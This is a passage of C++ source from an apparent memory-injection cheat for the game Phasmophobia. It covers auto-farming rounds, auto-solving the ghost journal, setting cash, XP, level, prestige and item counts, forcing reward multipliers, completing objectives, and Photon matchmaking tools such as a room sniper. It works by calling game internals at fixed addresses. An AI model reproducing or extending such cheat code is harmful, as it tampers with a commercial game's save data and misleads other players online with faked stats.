                    Phasmo_Call<void*>(Phasmo::RVA_ServerManager_StartGame, serverManager);
                    s_autoFarmLastActionAtMs = now;
                    Logger::WriteLine("[AutoFarm] StartGame sent");
                    PushNotification("AutoFarm", "StartGame sent");
                }
            }

            if (NETWORK_AutoFarmAutoRerun && lobbyElapsedMs >= lobbyTimeoutMs)
                TriggerAutoFarmRetry("lobby timeout");

            s_autoFarmLastEnabled = true;
            s_autoFarmLastInGame = inGame;
            s_autoFarmLastInRoom = inRoom;
            return;
        }

        if (s_autoFarmRoundEnteredAtMs == 0)
            s_autoFarmRoundEnteredAtMs = now;

        const ULONGLONG maxRoundMs = static_cast<ULONGLONG>(std::max(15, NETWORK_AutoFarmMaxRoundSec)) * 1000ULL;
        const ULONGLONG endDelayMs = static_cast<ULONGLONG>(std::max(0, NETWORK_AutoFarmEndDelaySec)) * 1000ULL;
        const ULONGLONG roundElapsedMs = now - s_autoFarmRoundEnteredAtMs;

        if (roundElapsedMs >= maxRoundMs) {
            if ((now - s_autoFarmLastActionAtMs) >= 1000ULL) {
                TryApplyAutoFarmRoundFinishRaw();
                s_autoFarmLastActionAtMs = now;
            }

            if (roundElapsedMs >= (maxRoundMs + endDelayMs))
                TriggerAutoFarmRetry("max round time");
        }

        s_autoFarmLastEnabled = true;
        s_autoFarmLastInGame = inGame;
        s_autoFarmLastInRoom = inRoom;
    }

    static Phasmo::SingleplayerProfile* GetSingleplayerProfile()
    {
        Phasmo::GhostOS* os = FindGhostOS();
        if (!os || !Phasmo_Safe(os, sizeof(Phasmo::GhostOS)))
            return Phasmo_GetSingleton<Phasmo::SingleplayerProfile>("SingleplayerProfile");

        auto* profile = reinterpret_cast<Phasmo::SingleplayerProfile*>(os->singleplayerProfile);
        if (profile && Phasmo_Safe(profile, sizeof(Phasmo::SingleplayerProfile)))
            return profile;

        // Fallback: try global singleton in case GhostOS pointer is stale.
        return Phasmo_GetSingleton<Phasmo::SingleplayerProfile>("SingleplayerProfile");
    }

    static Phasmo::StoreManager* GetStoreManager()
    {
        Phasmo::GhostOS* os = FindGhostOS();
        if (os && Phasmo_Safe(os, sizeof(Phasmo::GhostOS))) {
            auto* store = reinterpret_cast<Phasmo::StoreManager*>(os->storeManager);
            if (store && Phasmo_Safe(store, sizeof(Phasmo::StoreManager)))
                return store;
        }

        return Phasmo_FindFirstObjectOfType<Phasmo::StoreManager>("", "StoreManager", "Assembly-CSharp");
    }

    static Phasmo::SaveFileController* GetSaveFileController()
    {
        auto* controller = Phasmo_GetSingleton<Phasmo::SaveFileController>("SaveFileController");
        if (controller && Phasmo_Safe(controller, sizeof(Phasmo::SaveFileController)))
            return controller;
        return Phasmo_FindFirstObjectOfType<Phasmo::SaveFileController>("", "SaveFileController", "Assembly-CSharp");
    }

    static Phasmo::RewardManager* GetRewardManager()
    {
        static Phasmo::RewardManager* s_cached = nullptr;
        static ULONGLONG s_nextLookupAt = 0;

        if (s_cached && Phasmo_Safe(s_cached, sizeof(Phasmo::RewardManager)))
            return s_cached;

        const ULONGLONG now = GetTickCount64();
        if (now < s_nextLookupAt)
            return nullptr;

        s_nextLookupAt = now + 1000ULL;
        s_cached = Phasmo_FindFirstObjectOfType<Phasmo::RewardManager>("", "RewardManager", "Assembly-CSharp");
        return (s_cached && Phasmo_Safe(s_cached, sizeof(Phasmo::RewardManager))) ? s_cached : nullptr;
    }

    static Phasmo::ChallengesController* GetChallengesController()
    {
        if (!Phasmo::RVA_ChallengesController_GetInstance)
            return nullptr;

        __try {
            return Phasmo_Call<Phasmo::ChallengesController*>(Phasmo::RVA_ChallengesController_GetInstance, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }
    }

    static void QueueRewardScreenPolish(int cashBonus, int xpBonus)
    {
        s_rewardScreenCashBonus = cashBonus;
        s_rewardScreenXpBonus = xpBonus;
        s_rewardScreenMultiplier = std::max(1.0f, MORE_BonusRewardValue);
        s_rewardScreenPerfectGame = MORE_AlwaysPerfectGame;
        s_rewardScreenPolishUntilMs = GetTickCount64() + 30000ULL;
    }

    static bool TrySetTmpTextDirect(void* tmpText, const char* utf8Text)
    {
        if (!tmpText || !utf8Text || !Phasmo_Safe(tmpText, 0x20))
            return false;

        using SetTextFn = void(*)(void*, Il2CppString*, const MethodInfo*);
        static SetTextFn setText = nullptr;
        if (!setText)
            setText = Phasmo_ResolveMethod<SetTextFn>("TMPro", "TMP_Text", "set_text", 1, "Unity.TextMeshPro");
        if (!setText)
            return false;

        Il2CppString* text = Phasmo_StringNew(utf8Text);
        if (!text)
            return false;

        __try {
            setText(tmpText, text, nullptr);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static void TrySetRewardUiTexts(Phasmo::RewardUI* rewardUi, const char* text)
    {
        if (!rewardUi || !text || !Phasmo_Safe(rewardUi, sizeof(Phasmo::RewardUI)))
            return;

        TrySetTmpTextDirect(rewardUi->primaryText, text);
        TrySetTmpTextDirect(rewardUi->valueText, text);
    }

    static void ApplyRewardScreenPolish()
    {
        static ULONGLONG s_nextUpdateAt = 0;

        if (s_rewardScreenPolishUntilMs == 0)
            return;

        const ULONGLONG now = GetTickCount64();
        if (now >= s_rewardScreenPolishUntilMs) {
            s_rewardScreenPolishUntilMs = 0;
            s_nextUpdateAt = 0;
            return;
        }
        if (now < s_nextUpdateAt)
            return;
        s_nextUpdateAt = now + 250ULL;

        __try {
            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            if (values && Phasmo_Safe(values, sizeof(Phasmo::LevelValues)) && values->inGame)
                return;

            if (!MORE_CustomBonusReward || s_rewardScreenMultiplier <= 1.0f)
                return;

            Phasmo::RewardManager* reward = GetRewardManager();
            if (!reward || !Phasmo_Safe(reward, sizeof(Phasmo::RewardManager)))
                return;

            char multiplierBuffer[32];
            snprintf(multiplierBuffer, sizeof(multiplierBuffer), "x%.2f", s_rewardScreenMultiplier);

            TrySetRewardUiTexts(reward->multiplierRewardUI, multiplierBuffer);
            TrySetRewardUiTexts(reward->eventMultiplierRewardUI, multiplierBuffer);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            s_rewardScreenPolishUntilMs = 0;
        }
    }

    static void RefreshChallengeManagers()
    {
        __try {
            Phasmo::ChallengesController* controller = GetChallengesController();
            TryRequestRefreshManagers(controller);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void QueueProfileSave()
    {
        static ULONGLONG s_lastSaveAt = 0;
        if (!PROFILE_AutoSaveAfterEdit)
            return;

        const ULONGLONG now = GetTickCount64();
        if (now - s_lastSaveAt < 1200)
            return;

        __try {
            Phasmo::SaveFileController* controller = GetSaveFileController();
            if (!controller || !Phasmo_Safe(controller, sizeof(Phasmo::SaveFileController)))
                return;

            TrySaveCacheFile(controller);
            TrySaveGameSettings(controller);
            s_lastSaveAt = now;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ProcessProfileSaveActions()
    {
        const bool wantsBackup = PROFILE_BackupSaveNow;
        const bool wantsReload = PROFILE_ReloadSaveNow;
        PROFILE_BackupSaveNow = false;
        PROFILE_ReloadSaveNow = false;

        if (!wantsBackup && !wantsReload)
            return;

        __try {
            Phasmo::SaveFileController* controller = GetSaveFileController();
            if (!controller || !Phasmo_Safe(controller, sizeof(Phasmo::SaveFileController)))
                return;

            if (wantsBackup && Phasmo::RVA_SaveFileController_CreateBackup)
                Phasmo_Call<void*>(Phasmo::RVA_SaveFileController_CreateBackup, controller, nullptr);

            if (wantsReload && Phasmo::RVA_SaveFileController_LoadGameState) {
                Phasmo_Call<void>(Phasmo::RVA_SaveFileController_LoadGameState, controller, nullptr);
                RefreshStoreUi(true, nullptr);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void TryRefreshStoreMoneyText(int cashValue)
    {
        if (cashValue < 0)
            cashValue = 0;

        Phasmo::GhostOS* os = FindGhostOS();
        if (!os || !Phasmo_Safe(os, sizeof(Phasmo::GhostOS)))
            return;

        if (TryGhostOsUpdateMoneyUi(os))
            return;

        if (!os->playerMoneyText)
            return;

        using SetTextFn = void(*)(void*, Il2CppString*, const MethodInfo*);
        static SetTextFn setText = nullptr;
        if (!setText)
            setText = Phasmo_ResolveMethod<SetTextFn>("TMPro", "TMP_Text", "set_text", 1, "Unity.TextMeshPro");
        if (!setText)
            return;

        char moneyBuffer[64];
        snprintf(moneyBuffer, sizeof(moneyBuffer), "$%d", cashValue);
        Il2CppString* text = Phasmo_StringNew(moneyBuffer);
        if (!text)
            return;

        __try {
            setText(os->playerMoneyText, text, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyJournalSolver()
    {
        static ULONGLONG s_lastSolveAt = 0;
        static int s_lastSolvedGhost = -1;

        const bool manualSolve = GHOST_SolveJournalNow;
        GHOST_SolveJournalNow = false;

        if (!manualSolve && !GHOST_AutoJournalSolver)
            return;
        if (!s_localPlayer || !Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player)))
            return;

        const ULONGLONG now = GetTickCount64();
        if (!manualSolve && now - s_lastSolveAt < 1500)
            return;

        Phasmo::GhostAI* ghost = Phasmo_GetGhostAI();
        Phasmo::GhostInfo* info = nullptr;
        if (!TryGetGhostInfo(ghost, info) || !info)
            return;

        const int ghostType = static_cast<int>(info->ghostTypeInfo.primaryType);
        if (!manualSolve && s_lastSolvedGhost == ghostType)
            return;

        void* journal = s_localPlayer->journalController;
        if (!journal || !Phasmo_Safe(journal, 0x20))
            return;

        Phasmo::GhostController* ghostController = Phasmo_GetGhostController();
        if (!ghostController || !Phasmo_Safe(ghostController, 0x28))
            return;

        void* fullEvidenceList = TryGetGhostFullEvidenceListRaw(ghostController, info->ghostTypeInfo.primaryType);
        std::vector<int32_t> evidenceValues = GetEvidenceListValues(fullEvidenceList);
        if (evidenceValues.empty())
            evidenceValues = GetEvidenceListValues(info->ghostTypeInfo.evidencePrimary);
        if (evidenceValues.empty())
            return;

        Phasmo_Call<void>(Phasmo::RVA_JournalController_OpenCloseJournal, journal, true, nullptr);
        Phasmo_Call<void>(Phasmo::RVA_JournalController_SetGhostTypes, journal, nullptr);

        for (int32_t evidence : evidenceValues) {
            if (evidence < 0 || evidence > 40 || evidence == 20)
                continue;
            Phasmo_Call<void>(Phasmo::RVA_JournalController_AddEvidence, journal, evidence, nullptr);
        }

        Phasmo_Call<void>(Phasmo::RVA_JournalController_SelectGhost, journal, ghostType, nullptr);

        s_lastSolveAt = now;
        s_lastSolvedGhost = ghostType;
    }

    static void RefreshStoreUi(bool refreshUpgradeStatus, const int* cashValue)
    {
        __try {
            if (cashValue)
                TryRefreshStoreMoneyText(*cashValue);

            Phasmo::StoreManager* store = GetStoreManager();
            if (!store || !Phasmo_Safe(store, sizeof(Phasmo::StoreManager)))
                return;

            if (refreshUpgradeStatus)
                TryStoreManagerUpdateUpgradeStatus(store);
            if (Phasmo::RVA_StoreManager_UpdateBuySellValue)
                Phasmo_Call<void>(Phasmo::RVA_StoreManager_UpdateBuySellValue, store, nullptr);
            if (Phasmo::RVA_StoreManager_UpdateBuySellInteractableState)
                Phasmo_Call<void>(Phasmo::RVA_StoreManager_UpdateBuySellInteractableState, store, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static Il2CppString* TryGetTmpTextString(void* tmpText)
    {
        if (!tmpText || !Phasmo_Safe(tmpText, 0x40))
            return nullptr;

        __try {
            return Phasmo_Call<Il2CppString*>(Phasmo::RVA_TMP_Text_get_text, tmpText, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }
    }

    static bool TryParseMoneyString(Il2CppString* text, int& outValue)
    {
        outValue = 0;
        if (!text)
            return false;

        __try {
            const int32_t length = text->length;
            if (length <= 0 || length > 64)
                return false;

            const size_t requiredBytes =
                offsetof(Il2CppString, chars) + (static_cast<size_t>(length) + 1) * sizeof(char16_t);
            if (!Phasmo_Safe(text, requiredBytes))
                return false;

            int value = 0;
            bool negative = false;
            for (int32_t i = 0; i < length; ++i) {
                const char16_t c = text->chars[i];
                if (c == u'-')
                    negative = true;
                if (c >= u'0' && c <= u'9') {
                    if (value > 100000000)
                        return false;
                    value = (value * 10) + static_cast<int>(c - u'0');
                }
            }

            outValue = negative ? -value : value;
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            outValue = 0;
            return false;
        }
    }

    static bool TryGetProfileCash(int& outCash)
    {
        outCash = 0;
        __try {
            Phasmo::GhostOS* os = FindGhostOS();
            if (!os || !Phasmo_Safe(os, sizeof(Phasmo::GhostOS)))
                return false;
            if (!os->playerMoneyText)
                return false;

            Il2CppString* text = TryGetTmpTextString(os->playerMoneyText);
            return TryParseMoneyString(text, outCash);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            outCash = 0;
            return false;
        }
    }

    static void ApplyProfileEdits()
    {
        if (!PROFILE_AddCash && !PROFILE_AddXP && !PROFILE_SetCash)
            return;

        const bool wantsSetCash = PROFILE_SetCash;
        const bool wantsAddCash = PROFILE_AddCash;
        const bool wantsAddXP = PROFILE_AddXP;

        int cashDelta = 0;
        int xpDelta = wantsAddXP ? PROFILE_XPDelta : 0;
        int desiredCashAfterEdit = -1;

        if (wantsSetCash) {
            int currentCash = 0;
            if (TryGetProfileCash(currentCash)) {
                cashDelta = PROFILE_CashTarget - currentCash;
            } else {
                cashDelta = PROFILE_CashTarget;
                Logger::WriteLine("[Phasmo] Cash set fallback: using delta=%d (current cash unavailable).",
                    cashDelta);
            }
            desiredCashAfterEdit = std::max(0, PROFILE_CashTarget);
        } else if (wantsAddCash) {
            cashDelta = PROFILE_CashDelta;
            int currentCash = 0;
            if (TryGetProfileCash(currentCash))
                desiredCashAfterEdit = std::max(0, currentCash + cashDelta);
        }

        PROFILE_AddCash = false;
        PROFILE_AddXP = false;
        PROFILE_SetCash = false;

        if (cashDelta == 0 && xpDelta == 0)
            return;

        __try {
            Phasmo::SingleplayerProfile* profile = GetSingleplayerProfile();
            if (!profile)
                return;

            if (TrySingleplayerAddXpAndFunds(profile, xpDelta, cashDelta)) {
                RefreshStoreUi(false, desiredCashAfterEdit >= 0 ? &desiredCashAfterEdit : nullptr);
                QueueProfileSave();
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyProfileVisualEdits()
    {
        if (!PROFILE_SetLevel && !PROFILE_SetPrestige)
            return;

        const bool wantsLevel = PROFILE_SetLevel;
        const bool wantsPrestige = PROFILE_SetPrestige;
        PROFILE_SetLevel = false;
        PROFILE_SetPrestige = false;

        Phasmo::NetworkPlayerSpot* spot = GetLocalNetworkSpot();
        if (!spot || !Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot)))
            return;

        if (wantsLevel) {
            int lvl = std::max(0, PROFILE_LevelValue);
            spot->level = lvl;
        }

        if (wantsPrestige) {
            int pre = std::max(0, PROFILE_PrestigeValue);
            spot->prestige = pre;
            spot->prestigeIndex = pre;
            spot->prestigeTheme = (pre > 0);
        }

        RefreshLobbyProfilesForSpot(spot, true);
    }

    static void ApplyInventoryEdits()
    {
        if (!PROFILE_SetItems)
            return;

        const int targetCount = std::max(0, PROFILE_ItemCount);
        PROFILE_SetItems = false;

        __try {
            Phasmo::GhostOS* os = FindGhostOS();
            if (!os || !Phasmo_Safe(os, sizeof(Phasmo::GhostOS)))
                return;

            auto* manager = reinterpret_cast<Phasmo::InventoryManager*>(os->inventoryManager);
            if (!manager || !Phasmo_Safe(manager, sizeof(Phasmo::InventoryManager)))
                return;

            Phasmo::Il2CppArray* arr = manager->inventoryEquipment;
            if (!arr || !Phasmo_Safe(arr, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
                return;

            int32_t count = arr->max_length;
            if (count <= 0)
                return;
            if (count > 64)
                count = 64;

            const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(void*);
            if (!Phasmo_Safe(arr, bytes))
                return;

            for (int32_t i = 0; i < count; ++i) {
                void* obj = *reinterpret_cast<void**>(
                    reinterpret_cast<uint8_t*>(arr) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));
                auto* item = reinterpret_cast<Phasmo::InventoryEquipment*>(obj);
                if (!item || !Phasmo_Safe(item, 0x88))
                    continue;

                item->ownedCount = targetCount;
                item->loadoutCount = targetCount;

                Phasmo_Call<void>(Phasmo::RVA_InventoryEquipment_UpdateUpgradeStatus, item, nullptr);
                Phasmo_Call<void>(Phasmo::RVA_InventoryEquipment_SaveItem, item, nullptr);
            }

            Phasmo_Call<void>(Phasmo::RVA_InventoryManager_UpdateInventory, manager, nullptr);
            Phasmo_Call<void>(Phasmo::RVA_InventoryManager_SaveInventory, manager, nullptr);
            RefreshStoreUi(true, nullptr);
            QueueProfileSave();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyCashOverride()
    {
        static int s_lastKnownCash = INT_MIN;
        static DWORD s_lastPollMs = 0;

        if (!PROFILE_CashOverride) {
            s_lastKnownCash = INT_MIN;
            s_lastPollMs = 0;
            return;
        }

        // Poll cash every ~200ms to detect store transactions.
        DWORD now = GetTickCount();
        if (now - s_lastPollMs < 200)
            return;
        s_lastPollMs = now;

        int currentCash = 0;
        if (!TryGetProfileCash(currentCash))
            return;

        // First poll: just record current cash, don't force yet.
        if (s_lastKnownCash == INT_MIN) {
            s_lastKnownCash = currentCash;
            return;
        }

        // Cash changed = a store transaction just happened (buy/sell).
        // Force cash to our target value by injecting the delta.
        if (currentCash != s_lastKnownCash) {
            const int delta = PROFILE_CashOverrideValue - currentCash;
            if (delta != 0) {
                __try {
                    Phasmo::SingleplayerProfile* profile = GetSingleplayerProfile();
                    if (profile)
                        TrySingleplayerAddXpAndFunds(profile, 0, delta);
                }
                __except (EXCEPTION_EXECUTE_HANDLER) {}
            }
            RefreshStoreUi(false, &PROFILE_CashOverrideValue);
            QueueProfileSave();
            s_lastKnownCash = PROFILE_CashOverrideValue;
        }
    }

    static void ApplyEndGameProfileBonus()
    {
        static bool s_lastRoundInGame = false;
        static ULONGLONG s_lastAutoApplyAt = 0;

        const bool manualApply = PROFILE_ApplyEndGameBonusNow;
        PROFILE_ApplyEndGameBonusNow = false;

        const int cashBonus = PROFILE_EndGameCashBonus;
        const int xpBonus = PROFILE_EndGameXPBonus;
        const bool enabled = PROFILE_AutoEndGameBonus && (cashBonus != 0 || xpBonus != 0);

        Phasmo::LevelValues* values = Phasmo_GetLevelValues();
        if (!values || !Phasmo_Safe(values, sizeof(Phasmo::LevelValues))) {
            if (!enabled && !manualApply)
                s_lastRoundInGame = false;
            return;
        }

        const bool inGame = values->inGame;
        bool shouldApply = manualApply;
        if (enabled && s_lastRoundInGame && !inGame)
            shouldApply = true;

        s_lastRoundInGame = inGame;

        if (!shouldApply)
            return;
        if (cashBonus == 0 && xpBonus == 0)
            return;

        const ULONGLONG now = GetTickCount64();
        if (!manualApply && (now - s_lastAutoApplyAt) < 4000ULL)
            return;

        __try {
            Phasmo::SingleplayerProfile* profile = GetSingleplayerProfile();
            if (!profile)
                return;

            if (TrySingleplayerAddXpAndFunds(profile, xpBonus, cashBonus)) {
                QueueProfileSave();
                QueueRewardScreenPolish(cashBonus, xpBonus);
                RefreshChallengeManagers();
                s_lastAutoApplyAt = now;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyBonusRewardModifier()
    {
        static ULONGLONG s_nextApplyAt = 0;

        if (!MORE_CustomBonusReward)
            return;

        const ULONGLONG now = GetTickCount64();
        if (now < s_nextApplyAt)
            return;
        s_nextApplyAt = now + 250ULL;

        __try {
            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            if (!values)
                return;

            const float multiplier = std::max(1.0f, MORE_BonusRewardValue);
            if (values->currentDifficulty && Phasmo_Safe(values->currentDifficulty, sizeof(Phasmo::Difficulty))) {
                values->currentDifficulty->difficulty = 6;
                values->currentDifficulty->overrideMultiplier = multiplier;
            }
            if (values->previousDifficulty && Phasmo_Safe(values->previousDifficulty, sizeof(Phasmo::Difficulty))) {
                values->previousDifficulty->difficulty = 6;
                values->previousDifficulty->overrideMultiplier = multiplier;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void CompleteObjectivesNow(Phasmo::ObjectiveManager* manager, Phasmo::LevelValues* values)
    {
        if (!manager || !values)
            return;

        void* arrayPtr = Phasmo_Call<void*>(Phasmo::RVA_LevelValues_GetObjectivesTypes, values, nullptr);
        if (!arrayPtr || !Phasmo_Safe(arrayPtr, Phasmo::ARRAY_LENGTH + sizeof(int32_t)))
            return;

        int32_t count = *reinterpret_cast<int32_t*>(
            reinterpret_cast<uint8_t*>(arrayPtr) + Phasmo::ARRAY_LENGTH);
        if (count <= 0)
            return;

        if (count > 10)
            count = 10;

        const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(int32_t);
        if (!Phasmo_Safe(arrayPtr, bytes))
            return;

        int32_t* entries = reinterpret_cast<int32_t*>(
            reinterpret_cast<uint8_t*>(arrayPtr) + Phasmo::ARRAY_FIRST_ELEMENT);

        for (int32_t i = 0; i < count; ++i) {
            const int32_t objective = entries[i];
            __try { Phasmo_Call<void>(Phasmo::RVA_ObjectiveManager_CompleteObjectiveSynced, manager, objective, nullptr); }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
            __try { Phasmo_Call<void>(Phasmo::RVA_ObjectiveManager_CompleteObjective, manager, objective, nullptr); }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }

        __try { Phasmo_Call<void>(Phasmo::RVA_ObjectiveManager_SetObjectives, manager, nullptr); }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
        RefreshChallengeManagers();
    }

    static void ApplyCompleteMissionsOnExit()
    {
        if (!MORE_CompleteMissions) {
            s_lastInGameState = false;
            s_completedObjectivesThisRound = false;
            return;
        }

        Phasmo::LevelValues* values = Phasmo_GetLevelValues();
        if (!values || !Phasmo_Safe(values, sizeof(Phasmo::LevelValues)))
            return;

        const bool inGame = values->inGame;

        if (inGame) {
            s_lastInGameState = true;
            s_completedObjectivesThisRound = false;
            return;
        }

        if (s_lastInGameState && !s_completedObjectivesThisRound) {
            Phasmo::ObjectiveManager* manager = Phasmo_GetObjectiveManager();
            if (manager && Phasmo_Safe(manager, sizeof(Phasmo::ObjectiveManager))) {
                CompleteObjectivesNow(manager, values);
                s_completedObjectivesThisRound = true;
            }
        }

        s_lastInGameState = inGame;
    }

    static void* CreateDefaultRoomOptions()
    {
        constexpr ptrdiff_t kRoomOptionsIsVisible = 0x10;
        constexpr ptrdiff_t kRoomOptionsIsOpen = 0x11;
        constexpr ptrdiff_t kRoomOptionsMaxPlayers = 0x12;
        constexpr ptrdiff_t kRoomOptionsCleanupCacheOnLeave = 0x1C;

        Il2CppClass* klass = Phasmo_GetClass("Photon.Realtime", "RoomOptions", "PhotonRealtime");
        if (!klass)
            return nullptr;

        Il2CppObject* obj = Phasmo_ObjectNew(klass);
        if (!obj || !Phasmo_Safe(obj, 0x40))
            return nullptr;

        Phasmo_RuntimeObjectInit(obj);

        auto* bytes = reinterpret_cast<uint8_t*>(obj);
        bytes[kRoomOptionsIsVisible] = 1;
        bytes[kRoomOptionsIsOpen] = 1;
        bytes[kRoomOptionsCleanupCacheOnLeave] = 1;

        int maxPlayers = NETWORK_CreateRoomMaxPlayers;
        if (maxPlayers < 1) maxPlayers = 1;
        if (maxPlayers > 16) maxPlayers = 16;
        *reinterpret_cast<uint8_t*>(bytes + kRoomOptionsMaxPlayers) = static_cast<uint8_t>(maxPlayers);
        return obj;
    }

    static std::string TrimTrailingWhitespace(const char* text)
    {
        std::string value = text ? text : "";
        while (!value.empty() && std::isspace(static_cast<unsigned char>(value.back())))
            value.pop_back();
        return value;
    }

    static void* CreateTypedLobbyFilter()
    {
        constexpr ptrdiff_t kTypedLobbyName = 0x10;
        constexpr ptrdiff_t kTypedLobbyType = 0x18;

        const std::string lobbyName = TrimTrailingWhitespace(NETWORK_LobbyNameBuffer);
        int lobbyType = 0;
        switch (NETWORK_FilterLobbyType)
        {
        case 1: lobbyType = 2; break; // SqlLobby
        case 2: lobbyType = 3; break; // AsyncRandomLobby
        default: lobbyType = 0; break; // Default
        }

        if (lobbyName.empty() && lobbyType == 0)
            return nullptr;

        Il2CppClass* klass = Phasmo_GetClass("Photon.Realtime", "TypedLobby", "PhotonRealtime");
        if (!klass)
            return nullptr;

        Il2CppObject* obj = Phasmo_ObjectNew(klass);
        if (!obj || !Phasmo_Safe(obj, 0x20))
            return nullptr;

        Phasmo_RuntimeObjectInit(obj);

        auto* bytes = reinterpret_cast<uint8_t*>(obj);
        *reinterpret_cast<Il2CppString**>(bytes + kTypedLobbyName) =
            lobbyName.empty() ? nullptr : Phasmo_StringNew(lobbyName.c_str());
        *reinterpret_cast<uint8_t*>(bytes + kTypedLobbyType) = static_cast<uint8_t>(lobbyType);
        return obj;
    }

    static void ApplyNetworkMatchmakingTools()
    {
        enum class PendingRecoveryMode
        {
            None = 0,
            ConnectUsingSettings,
            Reconnect,
            ReconnectAndRejoin
        };

        static PendingRecoveryMode s_pendingRecoveryMode = PendingRecoveryMode::None;
        static ULONGLONG s_pendingRecoveryDeadlineMs = 0;
        static ULONGLONG s_nextRecoveryKickMs = 0;

        const bool wantsQuickRejoin = NETWORK_QuickRejoin;
        const bool wantsConnectUsingSettings = NETWORK_ConnectUsingSettings;
        const bool wantsReconnect = NETWORK_Reconnect;
        const bool wantsJoinRandom = NETWORK_JoinRandomRoom;
        const bool wantsJoinRandomFiltered = NETWORK_JoinRandomRoomFiltered;
        const bool wantsJoinRandomOrCreateFiltered = NETWORK_JoinRandomOrCreateRoomFiltered;
        const bool wantsJoinByName = NETWORK_JoinRoomByName;
        const bool wantsJoinOrCreate = NETWORK_JoinOrCreateRoom;
        const bool wantsCreateRoom = NETWORK_CreateRoomByName;
        const bool wantsLeaveRoom = NETWORK_LeaveRoom;
        const bool wantsLeaveLobby = NETWORK_LeaveLobby;
        const bool wantsDisconnectSelf = NETWORK_DisconnectSelf;
        const bool wantsRoomSniper = NETWORK_RoomSniper;
        const bool hasPendingRecovery = s_pendingRecoveryMode != PendingRecoveryMode::None;

        if (!wantsQuickRejoin && !wantsConnectUsingSettings && !wantsReconnect &&
            !wantsJoinRandom && !wantsJoinRandomFiltered &&
            !wantsJoinRandomOrCreateFiltered && !wantsJoinByName &&
            !wantsJoinOrCreate && !wantsCreateRoom &&
            !wantsLeaveRoom && !wantsLeaveLobby && !wantsDisconnectSelf &&
            !hasPendingRecovery)
        {
            if (!wantsRoomSniper)
                return;
        }

        NETWORK_QuickRejoin = false;
        NETWORK_ConnectUsingSettings = false;
        NETWORK_Reconnect = false;
        NETWORK_JoinRandomRoom = false;
        NETWORK_JoinRandomRoomFiltered = false;
        NETWORK_JoinRandomOrCreateRoomFiltered = false;
        NETWORK_JoinRoomByName = false;
        NETWORK_JoinOrCreateRoom = false;
        NETWORK_CreateRoomByName = false;
        NETWORK_LeaveRoom = false;
        NETWORK_LeaveLobby = false;
        NETWORK_DisconnectSelf = false;

        const std::string roomName = TrimTrailingWhitespace(NETWORK_RoomNameBuffer);
        const std::string sqlFilter = TrimTrailingWhitespace(NETWORK_SqlFilterBuffer);
        const bool connected = Phasmo_Call<bool>(Phasmo::RVA_PN_IsConnected);
        const bool ready = Phasmo_Call<bool>(Phasmo::RVA_PN_IsConnectedAndReady);
        const bool inLobby = Phasmo_Call<bool>(Phasmo::RVA_PN_GetInLobby);
        const bool inRoom = Phasmo_Call<bool>(Phasmo::RVA_PN_GetInRoom);
        const bool hasJoinRandomFilters =
            NETWORK_FilterExpectedMaxPlayers > 0 ||
            NETWORK_FilterMatchmakingMode > 0 ||
            NETWORK_FilterLobbyType > 0 ||
            !TrimTrailingWhitespace(NETWORK_LobbyNameBuffer).empty() ||
            !sqlFilter.empty();

        Il2CppString* roomNameStr = roomName.empty() ? nullptr : Phasmo_StringNew(roomName.c_str());
        Il2CppString* sqlFilterStr = sqlFilter.empty() ? nullptr : Phasmo_StringNew(sqlFilter.c_str());
        void* roomOptions = nullptr;
        void* typedLobby = CreateTypedLobbyFilter();

        uint8_t expectedMaxPlayers = static_cast<uint8_t>(std::clamp(NETWORK_FilterExpectedMaxPlayers, 0, 16));
        uint8_t matchmakingMode = static_cast<uint8_t>(std::clamp(NETWORK_FilterMatchmakingMode, 0, 2));

        auto joinRandomFiltered = [&]() {
            return Phasmo_Call<bool>(
                Phasmo::RVA_PN_JoinRandomRoomFiltered,
                nullptr,
                expectedMaxPlayers,
                matchmakingMode,
                typedLobby,
                sqlFilterStr,
                nullptr,
                nullptr);
        };

        auto joinRandomOrCreateFiltered = [&]() {
            if (!roomNameStr)
                return false;
            if (!roomOptions)
                roomOptions = CreateDefaultRoomOptions();
            if (!roomOptions)
                return false;
            return Phasmo_Call<bool>(
                Phasmo::RVA_PN_JoinRandomOrCreateRoom,
                nullptr,
                expectedMaxPlayers,
                matchmakingMode,
                typedLobby,
                sqlFilterStr,
                roomNameStr,
                roomOptions,
                nullptr,
                nullptr);
        };

        auto beginPendingRecovery = [&](PendingRecoveryMode mode) {
            s_pendingRecoveryMode = mode;
            const ULONGLONG now = GetTickCount64();
            s_pendingRecoveryDeadlineMs = now + 12000;
            s_nextRecoveryKickMs = 0;
        };

        auto drivePendingRecovery = [&]() {
            if (s_pendingRecoveryMode == PendingRecoveryMode::None)
                return false;

            const ULONGLONG now = GetTickCount64();
            if (!connected && !ready && !inLobby && !inRoom) {
                switch (s_pendingRecoveryMode) {
